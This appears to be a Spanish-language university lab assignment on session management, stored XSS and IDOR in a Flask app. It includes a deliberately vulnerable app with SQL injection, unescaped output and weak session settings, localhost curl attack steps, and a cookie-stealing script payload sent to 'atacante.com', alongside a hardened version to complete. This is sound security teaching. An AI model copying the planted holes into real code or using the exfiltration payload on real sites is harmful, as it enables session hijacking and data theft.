# LABORATORIO EN CASA — SEMANA 6
## Programación Segura DD281 | Universidad Autónoma del Perú
**Tema:** Gestión de Sesiones, XSS e IDOR  
**Tiempo estimado:** 2 horas  
**Modalidad:** Individual  
**Entrega:** Repositorio GitHub → semana-06/lab-casa/  
**Puntaje:** 100 puntos

---

## INSTRUCCIONES GENERALES

Antes de comenzar, lee completamente el laboratorio. Tienes una aplicación Flask vulnerable que deberás analizar, explotar y luego corregir. Sube tu trabajo al repositorio GitHub del curso en la carpeta `semana-06/lab-casa/` con los archivos:

- `app_vulnerable.py` (el código original sin modificar)
- `app_segura.py` (tu implementación con los TODOs completados)
- `evidencias/` (carpeta con capturas de pantalla o registros de las pruebas)
- `reflexion.md` (tu respuesta a la Tarea 2.3)

**Requisitos previos:**
```bash
pip install flask
```

---

## PARTE 1 — EXPLORACIÓN DE VULNERABILIDADES

**Duración estimada:** 60 minutos  
**Puntaje:** 40 puntos

### Código de análisis: `app_vulnerable.py`

Guarda el siguiente código en un archivo llamado `app_vulnerable.py` y ejecútalo con `python app_vulnerable.py`:

```python
from flask import Flask, request, session, jsonify, redirect
import sqlite3, os

app = Flask(__name__)
app.secret_key = "clave123"  # ❌ Clave débil y hardcodeada
app.config['SESSION_COOKIE_HTTPONLY'] = False  # ❌
app.config['SESSION_COOKIE_SECURE'] = False    # ❌

def get_db():
    conn = sqlite3.connect(':memory:')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE usuarios (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
        CREATE TABLE comentarios (id INTEGER PRIMARY KEY, contenido TEXT, autor_id INTEGER);
        CREATE TABLE documentos (id INTEGER PRIMARY KEY, titulo TEXT, contenido TEXT, propietario_id INTEGER);
        INSERT INTO usuarios VALUES (1, 'admin', 'Admin123!');
        INSERT INTO usuarios VALUES (2, 'carlos', 'Carlos456!');
        INSERT INTO comentarios VALUES (1, 'Bienvenidos al foro seguro', 1);
        INSERT INTO documentos VALUES (1, 'Contrato Confidencial', 'Datos sensibles del contrato...', 1);
        INSERT INTO documentos VALUES (2, 'Mi documento personal', 'Datos de Carlos...', 2);
    ''')
    conn.commit()
    return conn

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    conn = get_db()
    user = conn.execute(f"SELECT * FROM usuarios WHERE username='{username}' AND password='{password}'").fetchone()
    conn.close()
    if user:
        session['user_id'] = user['id']
        session['username'] = user['username']
        return jsonify({"mensaje": f"Bienvenido {user['username']}", "user_id": user['id']})
    return jsonify({"error": "Credenciales incorrectas"}), 401

@app.route('/comentario/nuevo', methods=['POST'])
def nuevo_comentario():
    if not session.get('user_id'):
        return jsonify({"error": "No autenticado"}), 401
    contenido = request.form.get('contenido', '')
    conn = get_db()
    conn.execute(f"INSERT INTO comentarios (contenido, autor_id) VALUES ('{contenido}', {session['user_id']})")
    conn.commit()
    conn.close()
    return jsonify({"mensaje": "Comentario guardado"})

@app.route('/comentarios')
def ver_comentarios():
    conn = get_db()
    comentarios = conn.execute("SELECT contenido FROM comentarios").fetchall()
    conn.close()
    html = "<html><body><h1>Comentarios</h1>"
    for c in comentarios:
        html += f"<div>{c['contenido']}</div>"  # ❌ Sin escape
    html += "</body></html>"
    return html

@app.route('/documento/<int:doc_id>')
def ver_documento(doc_id):
    if not session.get('user_id'):
        return redirect('/login')
    conn = get_db()
    doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()
    conn.close()
    if doc:
        return jsonify({"titulo": doc['titulo'], "contenido": doc['contenido']})
    return jsonify({"error": "No encontrado"}), 404

if __name__ == '__main__':
    app.run(debug=True, port=5001)
```

---

### Tarea 1.1 — Identificación de vulnerabilidades (10 puntos)

Analiza el código anterior línea por línea e identifica **todas** las vulnerabilidades presentes. Completa la siguiente tabla con **mínimo 5 vulnerabilidades**:

| # | Línea(s) de código | Vulnerabilidad | Clasificación OWASP 2021 | Impacto potencial |
|---|---|---|---|---|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |
| 6 (opcional) | | | | |

**Pistas para buscar:**
- Revisa cómo se construyen las consultas SQL (¿concatenación de strings o parámetros?)
- Observa qué pasa con el contenido del usuario antes de mostrarse en HTML
- Verifica si hay control de acceso adecuado en `/documento/<id>`
- Analiza la configuración de la sesión y la clave secreta
- ¿Qué información se expone innecesariamente en la respuesta del login?

---

### Tarea 1.2 — Demostración de XSS Almacenado (10 puntos)

Con la aplicación corriendo en `http://localhost:5001`, realiza los siguientes pasos:

**Paso 1:** Autentica como cualquier usuario usando curl:
```bash
curl -c cookies.txt -X POST http://localhost:5001/login \
  -d "username=carlos&password=Carlos456!"
```

**Paso 2:** Envía el payload XSS como comentario:
```bash
curl -b cookies.txt -X POST http://localhost:5001/comentario/nuevo \
  -d "contenido=<script>alert('XSS-' + document.cookie)</script>"
```

**Paso 3:** Abre un navegador y ve a `http://localhost:5001/comentarios`. Observa qué ocurre.

**Entrega esperada:** Captura de pantalla o texto del resultado mostrando que el script se ejecuta (o que el payload aparece sin ser escapado en el HTML fuente). Si el navegador moderno bloquea la alerta, incluye el HTML fuente usando:
```bash
curl http://localhost:5001/comentarios
```
Y documenta que el `<script>` aparece sin escapar en el HTML.

**Preguntas a responder junto con la evidencia:**
- ¿En qué categoría OWASP clasifica este ataque?
- ¿Por qué este XSS se llama "Almacenado" y no "Reflejado"?
- ¿Quién más se vería afectado si un atacante real publicara este payload?

---

### Tarea 1.3 — Demostración de IDOR (10 puntos)

**Escenario:** Eres el usuario `carlos` (id=2). El documento con id=1 pertenece al `admin` (id=1). Demuestra que puedes acceder a él sin autorización.

**Paso 1:** Autentícate como carlos y guarda las cookies:
```bash
curl -c cookies_carlos.txt -X POST http://localhost:5001/login \
  -d "username=carlos&password=Carlos456!"
```

**Paso 2:** Intenta acceder al documento del admin:
```bash
curl -b cookies_carlos.txt http://localhost:5001/documento/1
```

**Entrega esperada:** Captura o texto de la respuesta mostrando que carlos puede leer el "Contrato Confidencial" que pertenece al admin.

**Preguntas a responder:**
- ¿Qué línea de código en `ver_documento()` permite este ataque?
- En el contexto de OWASP Top 10 2021, ¿bajo qué categoría cae IDOR?
- ¿Cómo podría un atacante descubrir el rango de IDs válidos para explotar este IDOR en producción?

---

### Tarea 1.4 — Análisis del riesgo combinado XSS + cookies sin HttpOnly (10 puntos)

Responde la siguiente pregunta en un mínimo de 150 palabras:

La configuración actual tiene `SESSION_COOKIE_HTTPONLY = False`, lo que significa que JavaScript puede leer las cookies de sesión. Combinado con el XSS Almacenado demostrado en la Tarea 1.2:

1. ¿Qué podría hacer un atacante que logre inyectar el siguiente payload más sofisticado?
   ```javascript
   <script>
   fetch('https://atacante.com/robo?c=' + document.cookie)
   </script>
   ```
2. Una vez que el atacante tiene la cookie de sesión de otro usuario, ¿qué puede hacer con ella?
3. ¿Por qué activar `HttpOnly=True` en la cookie rompe parcialmente este ataque, aunque no elimina completamente el riesgo de XSS?
4. ¿Qué configuración adicional de cookies ayudaría a mitigar el riesgo en tráfico no cifrado?

---

## PARTE 2 — IMPLEMENTACIÓN SEGURA

**Duración estimada:** 60 minutos  
**Puntaje:** 60 puntos

### Código base: `app_segura.py`

Copia el siguiente código en un archivo llamado `app_segura.py`. Tu tarea es **completar los 11 TODOs** con el código correcto:

```python
from flask import Flask, request, session, jsonify, redirect, make_response
import sqlite3, html, secrets, re
from functools import wraps

app = Flask(__name__)
# TODO 1: Usar secrets.token_hex(32) para la clave secreta
app.secret_key = "COMPLETAR_AQUI"

# TODO 2: Configurar las 3 propiedades de seguridad de la cookie de sesión
# SESSION_COOKIE_HTTPONLY = True
# SESSION_COOKIE_SECURE = True  
# SESSION_COOKIE_SAMESITE = 'Strict'

def requiere_login(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('user_id'):
            return jsonify({"error": "No autenticado"}), 401
        return f(*args, **kwargs)
    return decorated

def get_db():
    # Misma función que en app_vulnerable.py
    conn = sqlite3.connect(':memory:')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.executescript('''
        CREATE TABLE usuarios (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
        CREATE TABLE comentarios (id INTEGER PRIMARY KEY, contenido TEXT, autor_id INTEGER);
        CREATE TABLE documentos (id INTEGER PRIMARY KEY, titulo TEXT, contenido TEXT, propietario_id INTEGER);
        INSERT INTO usuarios VALUES (1, 'admin', 'Admin123!');
        INSERT INTO usuarios VALUES (2, 'carlos', 'Carlos456!');
        INSERT INTO comentarios VALUES (1, 'Bienvenidos al foro seguro', 1);
        INSERT INTO documentos VALUES (1, 'Contrato Confidencial', 'Datos sensibles del contrato...', 1);
        INSERT INTO documentos VALUES (2, 'Mi documento personal', 'Datos de Carlos...', 2);
    ''')
    conn.commit()
    return conn

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    
    # TODO 3: Validar que username solo contenga letras, números y guiones (regex)
    # if not re.match(r'^[a-zA-Z0-9_-]{3,30}$', username):
    #     return jsonify({"error": "Username inválido"}), 400
    
    conn = get_db()
    # TODO 4: Usar consulta parametrizada (prepared statement) para prevenir SQL Injection
    # user = conn.execute("SELECT * FROM usuarios WHERE username=? AND password=?", (username, password)).fetchone()
    user = None  # REEMPLAZAR CON TODO 4
    conn.close()
    
    if user:
        # TODO 5: Regenerar el session ID después del login (previene Session Fixation)
        # session.clear()
        session['user_id'] = user['id']
        session['username'] = user['username']
        return jsonify({"mensaje": f"Bienvenido {user['username']}"})
    return jsonify({"error": "Credenciales incorrectas"}), 401

@app.route('/comentario/nuevo', methods=['POST'])
@requiere_login
def nuevo_comentario():
    contenido = request.form.get('contenido', '').strip()
    
    # TODO 6: Validar longitud máxima del comentario (máximo 500 caracteres)
    
    conn = get_db()
    # TODO 7: Usar consulta parametrizada para insertar el comentario
    conn.close()
    return jsonify({"mensaje": "Comentario guardado"})

@app.route('/comentarios')
def ver_comentarios():
    conn = get_db()
    comentarios = conn.execute("SELECT contenido FROM comentarios").fetchall()
    conn.close()
    
    html_content = "<html><body><h1>Comentarios</h1>"
    for c in comentarios:
        # TODO 8: Escapar el contenido con html.escape() antes de incluirlo en HTML
        contenido_seguro = c['contenido']  # REEMPLAZAR CON TODO 8
        html_content += f"<div>{contenido_seguro}</div>"
    html_content += "</body></html>"
    return html_content

@app.route('/documento/<int:doc_id>')
@requiere_login
def ver_documento(doc_id):
    usuario_id = session['user_id']
    conn = get_db()
    # TODO 9: Verificar que el documento pertenece al usuario en sesión
    # doc = conn.execute("SELECT * FROM documentos WHERE id=? AND propietario_id=?", (doc_id, usuario_id)).fetchone()
    doc = None  # REEMPLAZAR CON TODO 9
    conn.close()
    
    if doc:
        return jsonify({"titulo": doc['titulo'], "contenido": doc['contenido']})
    # TODO 10: Devolver MISMO error 404 tanto si no existe como si no pertenece al usuario
    return jsonify({"error": "Documento no encontrado"}), 404

@app.after_request
def agregar_headers_seguridad(response):
    # TODO 11: Agregar Content-Security-Policy header
    # response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    return response

if __name__ == '__main__':
    app.run(debug=False, port=5002)  # ✅ debug=False en producción
```

---

### Tarea 2.1 — Completar los 11 TODOs (20 puntos)

Completa cada uno de los 11 TODOs en `app_segura.py`. Para cada TODO que completes, agrega un comentario explicando:

1. **Qué vulnerability previene** (nombre y categoría OWASP)
2. **Cómo funciona la mitigación** (en una oración técnica)

**Guía para cada TODO:**

- **TODO 1:** Reemplaza `"COMPLETAR_AQUI"` con `secrets.token_hex(32)`. Esto genera 32 bytes (256 bits) de entropía aleatoria criptográficamente segura.

- **TODO 2:** Descomenta y activa las 3 líneas de configuración de cookies. Asegúrate de que estén fuera de comentario y sean asignaciones reales a `app.config`.

- **TODO 3:** Descomenta el bloque de validación con regex. El patrón `^[a-zA-Z0-9_-]{3,30}$` acepta solo caracteres seguros para nombres de usuario.

- **TODO 4:** Reemplaza la línea `user = None` con la consulta parametrizada descomentada. Elimina la línea de comentario y la línea `user = None`.

- **TODO 5:** Descomenta `session.clear()` justo antes de asignar los valores de sesión.

- **TODO 6:** Agrega una validación `if len(contenido) > 500:` que retorne un error 400.

- **TODO 7:** Usa `conn.execute("INSERT INTO comentarios (contenido, autor_id) VALUES (?, ?)", (contenido, session['user_id']))` y luego `conn.commit()`.

- **TODO 8:** Reemplaza `c['contenido']` con `html.escape(c['contenido'])`.

- **TODO 9:** Reemplaza la línea `doc = None` con la consulta parametrizada descomentada.

- **TODO 10:** Este ya está correcto en el código base — solo verifica que el mensaje de error sea idéntico para ambos casos (no existe / no autorizado).

- **TODO 11:** Descomenta la línea del CSP header.

---

### Tarea 2.2 — Pruebas de que los ataques son rechazados (20 puntos)

Con `app_segura.py` corriendo en `http://localhost:5002`, repite exactamente los mismos ataques de la Parte 1 y documenta que ya no funcionan.

**Prueba A — XSS rechazado:**

```bash
# 1. Login
curl -c cookies_seguro.txt -X POST http://localhost:5002/login \
  -d "username=carlos&password=Carlos456!"

# 2. Intentar inyectar XSS
curl -b cookies_seguro.txt -X POST http://localhost:5002/comentario/nuevo \
  -d "contenido=<script>alert('XSS-' + document.cookie)</script>"

# 3. Ver cómo aparece el comentario
curl http://localhost:5002/comentarios
```

**Resultado esperado:** El payload debe aparecer como texto literal `&lt;script&gt;alert(...)&lt;/script&gt;` en el HTML, no como etiqueta ejecutable.

**Prueba B — IDOR rechazado:**

```bash
# 1. Login como carlos
curl -c cookies_carlos_seguro.txt -X POST http://localhost:5002/login \
  -d "username=carlos&password=Carlos456!"

# 2. Intentar acceder al documento del admin
curl -b cookies_carlos_seguro.txt http://localhost:5002/documento/1
```

**Resultado esperado:** Respuesta `{"error": "Documento no encontrado"}` con código HTTP 404.

**Entrega:** Capturas de pantalla o texto copiado de los resultados de terminal mostrando ambas pruebas y confirmando que los ataques son neutralizados.

---

### Tarea 2.3 — Reflexión técnico-legal (20 puntos)

Escribe una reflexión de **mínimo 200 palabras** respondiendo la siguiente pregunta:

**¿Cuál de los 3 temas de esta semana (XSS, gestión de sesiones, IDOR) consideras más crítico para una aplicación médica como MedApp? Argumenta tanto técnica como legalmente.**

Tu reflexión debe incluir:

1. **Postura clara:** ¿Cuál de los tres es más crítico y por qué?
2. **Argumento técnico:** Explica el impacto concreto de esa vulnerabilidad en el contexto médico (datos de pacientes, diagnósticos, historiales).
3. **Relación entre vulnerabilidades:** Explica cómo las tres vulnerabilidades pueden encadenarse en un ataque más sofisticado.
4. **Marco legal peruano:** Menciona la **Ley 29733 — Ley de Protección de Datos Personales del Perú** y explica por qué los datos médicos reciben protección especial como "datos sensibles". Indica las posibles consecuencias legales de una brecha de seguridad.
5. **Recomendación profesional:** Si fueras el consultor de seguridad contratado por MedApp, ¿qué medida implementarías primero?

Guarda esta reflexión en un archivo llamado `reflexion.md` dentro de tu carpeta `semana-06/lab-casa/`.

---

## RÚBRICA DE EVALUACIÓN

| Criterio | Indicadores de logro completo | Puntaje |
|---|---|---|
| Parte 1.1 — Tabla de vulnerabilidades (mínimo 5 identificadas) | Tabla con mínimo 5 filas, código exacto, clasificación OWASP correcta, impacto descrito | 10 pts |
| Parte 1.2 — Demostración XSS con evidencia | Captura o texto mostrando que el payload aparece sin escapar en el HTML | 10 pts |
| Parte 1.3 — Demostración IDOR con evidencia | Captura o texto mostrando que carlos puede leer el documento del admin | 10 pts |
| Parte 1.4 — Explicación del riesgo combinado XSS + cookies | Explica que XSS roba cookie y cookie sin HttpOnly es legible por JavaScript | 10 pts |
| Parte 2.1 — 11 TODOs completados correctamente | Cada TODO con código correcto y comentario explicando qué vulnerabilidad previene | 20 pts |
| Parte 2.2 — Pruebas de que los ataques son rechazados | Evidencia de XSS convertido a texto y IDOR devolviendo 404 | 20 pts |
| Parte 2.3 — Reflexión técnico-legal argumentada | Mínimo 200 palabras, menciona Ley 29733, argumento técnico coherente | 20 pts |
| **TOTAL** | | **100 pts** |

---

## CHECKLIST ANTES DE ENTREGAR

Antes de hacer push a tu repositorio GitHub, verifica:

- [ ] `app_vulnerable.py` guardado sin modificaciones
- [ ] `app_segura.py` con los 11 TODOs completados y comentados
- [ ] Carpeta `evidencias/` con capturas de la Tarea 1.2 (XSS) y Tarea 1.3 (IDOR)
- [ ] Capturas de la Tarea 2.2 mostrando que los ataques son rechazados
- [ ] `reflexion.md` con mínimo 200 palabras y mención de la Ley 29733
- [ ] Tu nombre completo y código de alumno en un archivo `README.md`
- [ ] La carpeta está en `semana-06/lab-casa/` del repositorio

**Fecha límite de entrega:** Revisar el Aula Virtual (Blackboard) para la fecha exacta.
